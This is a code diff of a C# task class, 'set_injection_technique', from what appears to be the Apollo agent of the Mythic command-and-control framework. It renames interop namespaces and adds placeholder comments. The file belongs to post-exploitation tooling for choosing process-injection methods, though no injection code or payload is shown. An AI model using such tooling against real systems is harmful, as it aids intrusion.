@@ -6,15 +6,15 @@
 
 #if SET_INJECTION_TECHNIQUE
 
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 
 namespace Tasks
 {
     public class set_injection_technique : Tasking
     {
-        public set_injection_technique(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public set_injection_technique(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
@@ -31,8 +31,8 @@ namespace Tasks
                 resp = CreateTaskResponse($"Unknown technique: {_data.Parameters}", true, "error");
             }
 
-            
-            
+            // Your code here..
+            // Then add response to queue
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
